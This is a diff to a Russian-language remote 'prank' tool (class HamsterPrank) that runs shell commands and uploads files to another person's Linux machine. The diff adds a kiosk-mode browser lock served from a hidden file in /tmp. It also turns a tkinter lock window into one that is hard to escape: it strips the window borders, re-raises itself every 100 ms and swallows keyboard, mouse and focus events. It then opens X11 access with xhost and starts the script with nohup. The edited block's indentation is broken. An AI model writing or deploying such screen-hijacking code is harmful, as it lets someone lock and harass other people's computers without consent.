@@ -463,7 +463,8 @@ class HamsterPrank:
             print("4. Открыть CD привод (команда)")
             print("5. Спам CD приводом (команда)")
             print("6. Озвучить текст (через браузер)")
-            print("7. Блокировка экрана (команда)")
+            print("7. Блокировка экрана (через браузер)")
+            print("8. Блокировка экрана (команда)")
             print("0. Назад")
             print()
             
@@ -521,22 +522,57 @@ class HamsterPrank:
                 print("✓ Сообщение озвучено!" if success else f"✗ Ошибка: {output}")
                 input("\nНажми Enter...")
             elif choice == '7':
+                print("\nБлокирую экран на удаленке через HTML...")
+                from core.html_pranks import generate_screen_lock_html
+                html_content = generate_screen_lock_html(10)  # 10 секунд
+                import tempfile
+                with tempfile.NamedTemporaryFile(mode='w', suffix='.html', delete=False, encoding='utf-8') as f:
+                    f.write(html_content)
+                    local_path = f.name
+                
+                remote_path = f"/tmp/.screen_lock.html"
+                success, msg = pranks.client.upload_file(local_path, remote_path)
+                
+                if success:
+                    # Открываем в браузере в полноэкранном режиме
+                    pranks.client.execute_command(f"DISPLAY=:0 firefox --kiosk file://{remote_path} 2>&1 || DISPLAY=:0 chromium --kiosk file://{remote_path} 2>&1 &")
+                    
+                    time.sleep(2)
+                    
+                    # Проверяем что браузер запустился
+                    ps_success, ps_out = pranks.client.execute_command("ps aux | grep -E 'firefox|chromium' | grep -v grep")
+                    if ps_out.strip():
+                        print("✓ Экран заблокирован через HTML!")
+                        print("Окно закроется автоматически через 10 секунд")
+                    else:
+                        print("⚠ Браузер не найден")
+                        print("Установите firefox или chromium на удаленной машине")
+                else:
+                    print(f"✗ Ошибка загрузки: {msg}")
+                
+                import os
+                os.unlink(local_path)
+                input("\nНажми Enter...")
+            elif choice == '8':
                 confirm = input("Точно заблокировать экран? (y/n): ").strip().lower()
                 if confirm == 'y':
-                    print("\nБлокирую экран на удаленке...")
                 print("\nБлокирую экран на удаленке...")
                 # Сначала пробуем стандартные команды
-                lock_commands = [
+                    lock_commands = [
+
                     'gnome-screensaver-command --lock',
                     'xscreensaver-command -lock', 
                     'dm-tool lock',
                     'loginctl lock-session',
                     'i3lock -c 000000',  # альтернатива для i3
                     'light-locker-command --lock'
-                ]
+                    ]
+
                 
-                success = False
-                for cmd in lock_commands:
+                    success = False
+
+                    for cmd in lock_commands:
+
                     cmd_result, output = pranks.client.execute_command(f'DISPLAY=:0 {cmd} 2>&1 || true')
                     if cmd_result and 'error' not in output.lower() and 'failed' not in output.lower():
                         success = True
@@ -546,19 +582,27 @@ class HamsterPrank:
                     # Если стандартные команды не работают, пробуем через Python GUI
                     script = '''#!/usr/bin/env python3
 import tkinter as tk
-import time
 import os
 
 # Устанавливаем DISPLAY
 if 'DISPLAY' not in os.environ:
     os.environ['DISPLAY'] = ':0'
 
-# Создаем полноэкранное окно блокировки
 root = tk.Tk()
 root.title("System Lock")
+# Устанавливаем полноэкранный режим
 root.attributes('-fullscreen', True)
+# Делаем окно всегда поверх других
 root.attributes('-topmost', True)
+# Убираем границы окна чтобы было сложнее закрыть
+root.overrideredirect(True)
 root.configure(bg='black')
+
+# Получаем размеры экрана
+screen_width = root.winfo_screenwidth()
+screen_height = root.winfo_screenheight()
+# Устанавливаем точный размер и позицию
+root.geometry(f"{screen_width}x{screen_height}+0+0")
 
 # Создаем надпись "Экран заблокирован"
 label = tk.Label(root, text="SCREEN LOCKED", 
@@ -566,16 +610,33 @@ label = tk.Label(root, text="SCREEN LOCKED",
                 fg='red', bg='black')
 label.pack(expand=True)
 
-# Привязываем клавиши для срабатывания (любая клавиша может быть использована для проверки)
-def unlock_attempt(event):
-    # В реальном случае, разблокировка требует аутентификации
-    pass
+# Функция для поднятия окна поверх всех
+def bring_to_front():
+    root.lift()
+    root.focus_force()
+    # Повторяем каждые 100 миллисекунд
+    root.after(100, bring_to_front)
 
-root.bind('<Key>', unlock_attempt)
-root.bind('<Button>', unlock_attempt)
+# Запускаем функцию поднятия окна
+bring_to_front()
+
+# Привязываем все события к попыткам восстановить окно
+def any_event(event=None):
+    root.lift()
+    root.focus_force()
+    return "break"  # Прерываем дальнейшую обработку события
+
+# Привязываем все основные события
+root.bind('<Key>', any_event)
+root.bind('<Button>', any_event)
+root.bind('<Motion>', any_event)
+root.bind('<FocusIn>', any_event)
+root.bind('<Map>', any_event)
+root.bind('<Configure>', any_event)
+root.bind('<Activate>', any_event)
+
 root.focus_force()
 
-# Пытаемся ограничить управление окном (но не можем полностью его заблокировать без аутентификации)
 root.mainloop()
 '''
                     
@@ -588,9 +649,10 @@ root.mainloop()
                     upload_success, upload_msg = pranks.client.upload_file(local_path, remote_path)
                     
                     if upload_success:
-                        # Запускаем скрипт блокировки
+                        # Настраиваем права доступа к X11 и запускаем скрипт блокировки
                         pranks.client.execute_command("export DISPLAY=:0 && xhost +local: 2>/dev/null || true")
-                        pranks.client.execute_command(f"DISPLAY=:0 python3 {remote_path} &")
+                        pranks.client.execute_command(f"chmod +x {remote_path}")
+                        pranks.client.execute_command(f"DISPLAY=:0 nohup python3 {remote_path} >/dev/null 2>&1 &")
                         print("✓ Экран заблокирован (через GUI заглушку)")
                         success = True
                     else:
